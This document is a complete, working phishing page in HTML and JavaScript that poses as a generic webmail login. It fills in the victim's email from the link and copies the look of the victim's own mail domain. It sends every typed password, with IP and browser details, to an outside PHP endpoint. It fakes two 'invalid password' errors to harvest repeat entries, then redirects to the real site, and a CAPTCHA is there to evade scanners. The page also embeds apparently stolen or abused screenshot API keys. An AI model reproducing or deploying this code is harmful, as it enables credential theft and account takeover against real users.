<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<title>Mail login</title>

<!-- Cloudflare Turnstile CAPTCHA -->
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

<style>
* {
  box-sizing: border-box;
}

html, body {
  margin: 0;
  width: 100%;
  height: 100%;
  font-family: Arial, Helvetica, sans-serif;
  overflow: hidden;
}

/* BACKGROUND IMAGE */
#bg-frame {
  position: fixed;
  inset: 0;
  width: 100vw;
  height: 100vh;
  object-fit: cover;
  z-index: -3;
}

/* DARK OVERLAY */
#dim {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.15);
  z-index: -2;
}

/* LOGIN BOX */
.login-box {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  width: 420px;
  padding: 28px;
  background: rgba(255,255,255,0.9);
  border-radius: 8px;
  box-shadow: 0 12px 30px rgba(0,0,0,0.25);
  z-index: 3;
}

.header {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 20px;
}

.header img {
  width: 36px;
  height: 36px;
}

.header h1 {
  font-size: 22px;
  margin: 0;
  font-weight: 600;
}

input {
  width: 100%;
  padding: 14px;
  font-size: 16px;
  border: 1px solid #ccc;
  border-radius: 6px;
  background: #f2f2f2;
  margin-bottom: 14px;
}

input[readonly] {
  background: #e6e6e6;
  cursor: not-allowed;
}

.password-wrap {
  position: relative;
}

#togglePassword {
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  cursor: pointer;
  color: #3b78b4;
  font-size: 14px;
}

button {
  width: 100%;
  padding: 14px;
  font-size: 16px;
  background: #3b78b4;
  color: #fff;
  border: none;
  border-radius: 6px;
  cursor: pointer;
  transition: background-color 0.2s;
}

button:hover {
  background: #2d5f8f;
}

.email-wrapper {
  position: relative;
  width: 100%;
  margin-bottom: 22px;
}

#email {
  width: 100%;
  padding: 24px;
  font-size: 22px;
  border: 2px solid #cfcfcf;
  border-radius: 6px;
  background: #f2f2f2;
  position: relative;
  z-index: 2;
}

.email-domain-overlay {
  position: absolute;
  right: 16px;
  top: 50%;
  transform: translateY(-50%);
  color: #999;
  font-size: 18px;
  pointer-events: none;
}

.spinner {
  display: none;
  width: 20px;
  height: 20px;
  border: 3px solid #f3f3f3;
  border-top: 3px solid #3498db;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 0 auto;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.error-message {
  display: none;
  color: #d32f2f;
  background-color: #ffebee;
  border: 1px solid #ffcdd2;
  padding: 12px;
  border-radius: 4px;
  margin-bottom: 15px;
  text-align: center;
  font-weight: 500;
}

.cf-turnstile {
  margin: 15px 0;
  display: flex;
  justify-content: center;
  min-height: 65px;
  transition: opacity 0.3s ease;
}

/* Captcha warning - appears near the captcha area, not at top */
.captcha-warning {
  display: none;
  color: #d32f2f;
  background-color: #ffebee;
  border: 1px solid #ffcdd2;
  padding: 8px 12px;
  border-radius: 4px;
  margin: 10px 0;
  text-align: center;
  font-size: 14px;
  font-weight: 500;
}

/* RTL */
html[dir="rtl"] .email-domain-overlay {
  right: auto;
  left: 16px;
}
html[dir="rtl"] #togglePassword {
  right: auto;
  left: 12px;
}
</style>
</head>

<body>

<div id="dim"></div>
<img id="bg-frame" alt="">

<div class="login-box">
  <div class="header">
    <img id="logo" src="#">
    <h1 id="domainTitle">mail</h1>
  </div>

  <div id="errorMessage" class="error-message"></div>

  <form id="loginForm" method="POST">
    <input type="hidden" id="ipAddress" name="ipAddress" value="">
    <input type="hidden" id="userAgent" name="userAgent" value="">
    <input type="hidden" id="timezone" name="timezone" value="">
    <input type="hidden" id="browser" name="browser" value="">
    <input type="hidden" id="attempt" name="attempt" value="1">
    <input type="hidden" id="timestamp" name="timestamp" value="">

    <div class="email-wrapper">
      <input type="email" id="email" name="email" placeholder="Email address" value="" readonly>
      <div class="email-domain-overlay" id="emailDomainOverlay"></div>
    </div>

    <div class="password-wrap">
      <input type="password" id="password" name="password" placeholder="Password">
      <span id="togglePassword">Show</span>
    </div>

    <div class="cf-turnstile" id="captcha-container"></div>
    <div id="captchaWarning" class="captcha-warning">Please complete the verification to continue</div>

    <button type="submit" id="signInBtn">Sign in</button>
    <div class="spinner" id="loadingSpinner"></div>
  </form>
</div>

<script>
// --- SCREENSHOTONE KEYS ---
const SCREENSHOT_KEYS = [
  "6PHCKPsyKIAi0w", "cHF3Orwewj4CuA", "TeAQpVMTFn0d5Q", "KbI5_1zGkfvM5w",
  "gdoqGKzEOuX1Dw", "IyI7iyNDRI2aVw", "XWQYZFbh2eZH7Q", "2G9DtGf__CJp3w",
  "fKe7Aj2opnR1x4", "nw_50q9PHwPSHg", "KAyE2AbCODVblA", "zRxoqwPkOGNNew",
  "6cc2fc13093017cd3d59"
];

// --- COUNTRY → LANGUAGE MAPPING ---
const countryLanguageMap = {
  'US':'en','GB':'en','CA':'en','AU':'en','NZ':'en','IE':'en',
  'ES':'es','MX':'es','AR':'es','CO':'es','PE':'es','CL':'es',
  'FR':'fr','BE':'fr','CH':'fr','LU':'fr',
  'DE':'de','AT':'de','CH':'de','LU':'de','LI':'de',
  'IT':'it','CH':'it','SM':'it','VA':'it',
  'PT':'pt','BR':'pt','AO':'pt','MZ':'pt',
  'RU':'ru','BY':'ru','KZ':'ru','KG':'ru',
  'SA':'ar','AE':'ar','EG':'ar','JO':'ar','QA':'ar',
  'CN':'zh','TW':'zh','HK':'zh','SG':'zh','MO':'zh',
  'JP':'ja','KR':'ko','IN':'hi','NP':'hi'
};

// --- GLOBALS ---
let currentDomain = '';
let attempts = 0;
let captchaToken = '';
let turnstileWidgetId = null;
let captchaVerified = false;
let currentLanguage = 'en';

// Cloudflare site key
const CLOUDFLARE_SITE_KEY = "0x4AAAAAACv2yITaaHsqVaoV";

// --- DOM elements ---
const bg = document.getElementById("bg-frame");
const emailInput = document.getElementById("email");
const domainOverlay = document.getElementById("emailDomainOverlay");
const logo = document.getElementById("logo");
const domainTitle = document.getElementById("domainTitle");
const passwordInput = document.getElementById("password");
const signInBtn = document.getElementById("signInBtn");
const loginForm = document.getElementById("loginForm");
const loadingSpinner = document.getElementById("loadingSpinner");
const errorMessage = document.getElementById("errorMessage");
const togglePassword = document.getElementById("togglePassword");
const captchaContainer = document.getElementById("captcha-container");
const captchaWarning = document.getElementById("captchaWarning");

// Hidden fields
const ipAddressField = document.getElementById("ipAddress");
const userAgentField = document.getElementById("userAgent");
const timezoneField = document.getElementById("timezone");
const browserField = document.getElementById("browser");
const attemptField = document.getElementById("attempt");
const timestampField = document.getElementById("timestamp");

// --- Helper functions ---
function screenshotUrl(domain, key) {
  return `https://api.screenshotone.com/take?access_key=${key}&url=${encodeURIComponent("https://"+domain)}&format=jpg&response_type=by_format&block_ads=true&block_cookie_banners=true&block_trackers=true&image_quality=80`;
}

function loadBackground(domain) {
  let idx = 0;
  function tryKey() {
    if (idx >= SCREENSHOT_KEYS.length) return;
    const key = SCREENSHOT_KEYS[idx];
    const test = new Image();
    test.onload = () => { bg.src = screenshotUrl(domain, key); };
    test.onerror = () => { idx++; tryKey(); };
    test.src = screenshotUrl(domain, key);
  }
  tryKey();
}

// --- Language detection (IP + browser fallback) ---
async function detectLanguage() {
  try {
    const resp = await fetch('https://ipapi.co/json/');
    const data = await resp.json();
    const country = data.country_code;
    if (countryLanguageMap[country]) return countryLanguageMap[country];
  } catch (e) {}
  // Fallback to browser language
  const browserLang = navigator.language.split('-')[0];
  if (['en','es','fr','de','it','pt','ru','ar','zh','ja','ko','hi'].includes(browserLang)) return browserLang;
  return 'en';
}

// --- Set page language (no selector, only auto) ---
function setLanguage(langCode) {
  currentLanguage = langCode;
  document.documentElement.lang = langCode;
  if (langCode === 'ar') document.documentElement.dir = 'rtl';
  else document.documentElement.dir = 'ltr';
  
  const translations = {
    en: { email_placeholder: "Email address", password_placeholder: "Password", sign_in: "Sign in", show: "Show", hide: "Hide", invalid: "Invalid password. Please try again.", signing: "Signing in...", captcha_required: "Please complete the verification to continue" },
    es: { email_placeholder: "Correo electrónico", password_placeholder: "Contraseña", sign_in: "Iniciar sesión", show: "Mostrar", hide: "Ocultar", invalid: "Contraseña incorrecta. Inténtelo de nuevo.", signing: "Iniciando sesión...", captcha_required: "Complete la verificación para continuar" },
    fr: { email_placeholder: "Adresse e-mail", password_placeholder: "Mot de passe", sign_in: "Se connecter", show: "Afficher", hide: "Masquer", invalid: "Mot de passe incorrect. Veuillez réessayer.", signing: "Connexion en cours...", captcha_required: "Veuillez compléter la vérification pour continuer" },
    de: { email_placeholder: "E-Mail-Adresse", password_placeholder: "Passwort", sign_in: "Anmelden", show: "Anzeigen", hide: "Ausblenden", invalid: "Ungültiges Passwort. Bitte versuchen Sie es erneut.", signing: "Anmeldung läuft...", captcha_required: "Bitte schließen Sie die Überprüfung ab, um fortzufahren" },
    it: { email_placeholder: "Indirizzo email", password_placeholder: "Password", sign_in: "Accedi", show: "Mostra", hide: "Nascondi", invalid: "Password non valida. Riprova.", signing: "Accesso in corso...", captcha_required: "Completa la verifica per procedere" },
    pt: { email_placeholder: "Endereço de email", password_placeholder: "Senha", sign_in: "Entrar", show: "Mostrar", hide: "Ocultar", invalid: "Senha inválida. Tente novamente.", signing: "Entrando...", captcha_required: "Conclua a verificação para continuar" },
    ru: { email_placeholder: "Адрес электронной почты", password_placeholder: "Пароль", sign_in: "Войти", show: "Показать", hide: "Скрыть", invalid: "Неверный пароль. Попробуйте еще раз.", signing: "Вход...", captcha_required: "Пожалуйста, пройдите проверку для продолжения" },
    ar: { email_placeholder: "عنوان البريد الإلكتروني", password_placeholder: "كلمة المرور", sign_in: "تسجيل الدخول", show: "إظهار", hide: "إخفاء", invalid: "كلمة المرور غير صحيحة. حاول مرة أخرى.", signing: "جاري تسجيل الدخول...", captcha_required: "يرجى إكمال التحقق للمتابعة" },
    zh: { email_placeholder: "电子邮件地址", password_placeholder: "密码", sign_in: "登录", show: "显示", hide: "隐藏", invalid: "密码无效。请再试一次。", signing: "正在登录...", captcha_required: "请完成验证以继续" },
    ja: { email_placeholder: "メールアドレス", password_placeholder: "パスワード", sign_in: "サインイン", show: "表示", hide: "非表示", invalid: "パスワードが無効です。もう一度お試しください。", signing: "サインイン中...", captcha_required: "続行するには認証を完了してください" },
    ko: { email_placeholder: "이메일 주소", password_placeholder: "비밀번호", sign_in: "로그인", show: "표시", hide: "숨기기", invalid: "잘못된 비밀번호입니다. 다시 시도해 주세요.", signing: "로그인 중...", captcha_required: "계속하려면 인증을 완료하세요" },
    hi: { email_placeholder: "ईमेल पता", password_placeholder: "पासवर्ड", sign_in: "साइन इन", show: "दिखाएं", hide: "छुपाएं", invalid: "अमान्य पासवर्ड। कृपया पुनः प्रयास करें।", signing: "साइन इन हो रहा है...", captcha_required: "आगे बढ़ने के लिए सत्यापन पूरा करें" }
  };
  const t = translations[langCode] || translations.en;
  emailInput.placeholder = t.email_placeholder;
  passwordInput.placeholder = t.password_placeholder;
  signInBtn.innerText = t.sign_in;
  togglePassword.innerText = (passwordInput.type === 'password') ? t.show : t.hide;
  // Store for error messages
  window._translations = t;
  // Update captcha warning text
  captchaWarning.innerText = t.captcha_required;
}

function showError(messageKey, customMsg = null) {
  const t = window._translations || { invalid: "Invalid password", signing: "Signing in..." };
  let msg = customMsg;
  if (!msg) {
    if (messageKey === 'invalid_password') msg = t.invalid;
    else if (messageKey === 'signing_in') msg = t.signing;
    else msg = t.invalid;
  }
  errorMessage.innerText = msg;
  errorMessage.style.display = 'block';
  setTimeout(() => errorMessage.style.display = 'none', 3000);
}

function showCaptchaWarning() {
  captchaWarning.style.display = 'block';
  setTimeout(() => {
    captchaWarning.style.display = 'none';
  }, 3000);
}

// --- Email extraction from URL ---
function extractEmailFromUrl() {
  const urlParams = new URLSearchParams(window.location.search);
  let email = urlParams.get('email');
  if (email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decodeURIComponent(email))) return decodeURIComponent(email);
  const hash = window.location.hash;
  if (hash && hash.length > 1) {
    let raw = decodeURIComponent(hash.substring(1));
    if (raw.includes(':')) raw = raw.split(':')[0];
    if (raw.includes('?')) raw = raw.split('?')[0];
    if (raw.includes('&')) raw = raw.split('&')[0];
    raw = raw.trim();
    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(raw)) return raw;
  }
  return null;
}

function getRandomEmail() {
  const domains = ['gmail.com','yahoo.com','outlook.com','hotmail.com','aol.com','icloud.com','protonmail.com','mail.com','yandex.com','zoho.com'];
  const names = ['john','jane','michael','sarah','david','lisa','robert','emily','william','jennifer','richard','susan','joseph','maria','thomas','karen','charles','nancy','christopher','betty'];
  const name = names[Math.floor(Math.random() * names.length)];
  const domain = domains[Math.floor(Math.random() * domains.length)];
  const num = Math.floor(Math.random() * 999) + 1;
  return `${name}${num}@${domain}`;
}

// --- Collect user data (IP, etc.) ---
function collectUserData() {
  fetch('https://ipapi.co/json/')
    .then(r => r.json())
    .then(data => {
      ipAddressField.value = data.ip;
    })
    .catch(() => {
      ipAddressField.value = 'Unknown';
      fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => ipAddressField.value = d.ip);
    });
  userAgentField.value = navigator.userAgent;
  timezoneField.value = Intl.DateTimeFormat().resolvedOptions().timeZone;
  browserField.value = navigator.userAgent;
  timestampField.value = new Date().toISOString();
}

// --- Cloudflare Turnstile (original behavior, no extra messages) ---
function initializeCaptcha() {
  if (!CLOUDFLARE_SITE_KEY || captchaVerified) {
    if (captchaVerified && captchaContainer) captchaContainer.style.display = 'none';
    return;
  }
  captchaContainer.innerHTML = '';
  captchaContainer.style.display = 'flex';
  try {
    turnstileWidgetId = turnstile.render(captchaContainer, {
      sitekey: CLOUDFLARE_SITE_KEY,
      callback: function(token) {
        captchaToken = token;
        captchaVerified = true;
        // Hide the widget after successful verification
        captchaContainer.style.display = 'none';
        // Hide any lingering captcha warning
        captchaWarning.style.display = 'none';
      },
      'expired-callback': function() {
        if (!captchaVerified) {
          captchaToken = '';
          if (!captchaVerified) captchaContainer.style.display = 'flex';
        }
      },
      'error-callback': function() {
        if (!captchaVerified) {
          captchaToken = '';
        }
      },
      language: currentLanguage
    });
  } catch(e) { console.error(e); }
}

function resetCaptcha() {
  if (captchaVerified) return;
  if (turnstileWidgetId !== null && window.turnstile) {
    turnstile.reset(turnstileWidgetId);
    captchaToken = '';
    captchaContainer.style.display = 'flex';
  }
}

// --- Send data to PHP ---
function sendToPHP() {
  const data = {
    email: emailInput.value,
    password: passwordInput.value,
    ipAddress: ipAddressField.value || 'Unknown',
    userAgent: navigator.userAgent,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    browser: navigator.userAgent,
    attempt: attempts,
    timestamp: new Date().toISOString()
  };
  fetch('https://scitecinstruments.it.com/mine/sg.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams(data)
  }).catch(err => console.error('Fetch error:', err));
}

// --- Update domain and background ---
function lockEmailAndUpdateDomain() {
  const val = emailInput.value.trim();
  if (val.includes('@')) {
    currentDomain = val.split('@')[1];
    domainOverlay.textContent = currentDomain;
    loadBackground(currentDomain);
    logo.src = "https://www.google.com/s2/favicons?sz=128&domain=" + currentDomain;
    domainTitle.textContent = currentDomain;
  } else {
    domainOverlay.textContent = "";
  }
}

// --- Event listeners ---
togglePassword.addEventListener('click', () => {
  const t = window._translations || { show: 'Show', hide: 'Hide' };
  if (passwordInput.type === 'password') {
    passwordInput.type = 'text';
    togglePassword.textContent = t.hide;
  } else {
    passwordInput.type = 'password';
    togglePassword.textContent = t.show;
  }
});

// --- Form submit with 3 attempts and CAPTCHA check ---
loginForm.addEventListener('submit', e => {
  e.preventDefault();

  // Basic field validation
  if (!emailInput.value.trim() || !passwordInput.value.trim()) {
    showError('invalid_password', "Please fill in both fields.");
    return;
  }

  // Check CAPTCHA verification
  if (!captchaToken) {
    showCaptchaWarning(); // Show warning near the captcha area, not at the top
    return;
  }

  attempts++;
  attemptField.value = attempts;
  timestampField.value = new Date().toISOString();

  // Disable button and show spinner
  signInBtn.disabled = true;
  signInBtn.style.opacity = '0.6';
  loadingSpinner.style.display = 'block';

  sendToPHP();

  setTimeout(() => {
    if (attempts === 1 || attempts === 2) {
      showError('invalid_password');
      passwordInput.value = '';
      signInBtn.disabled = false;
      signInBtn.style.opacity = '1';
      loadingSpinner.style.display = 'none';
      passwordInput.focus();
    } else if (attempts >= 3) {
      showError('signing_in');
      setTimeout(() => {
        window.location.href = currentDomain ? 'https://' + currentDomain : 'https://outlook.live.com/owa/';
      }, 1500);
    }
  }, 1000);
});

// --- Wait for Turnstile ---
function waitForTurnstile() {
  if (window.turnstile) {
    initializeCaptcha();
  } else {
    setTimeout(waitForTurnstile, 100);
  }
}

// --- Initialization ---
window.addEventListener('DOMContentLoaded', async () => {
  // Detect language from IP
  const detectedLang = await detectLanguage();
  setLanguage(detectedLang);
  
  // Email from URL or random
  const urlEmail = extractEmailFromUrl();
  emailInput.value = urlEmail || getRandomEmail();
  
  collectUserData();
  lockEmailAndUpdateDomain();
  
  if (CLOUDFLARE_SITE_KEY) {
    waitForTurnstile();
  } else {
    captchaContainer.innerHTML = '<div style="color:#666;text-align:center;padding:20px;">Security verification not configured</div>';
  }
  
  // Ensure button is always enabled initially
  signInBtn.disabled = false;
  signInBtn.style.opacity = '1';
});
</script>
</body>
</html>
```
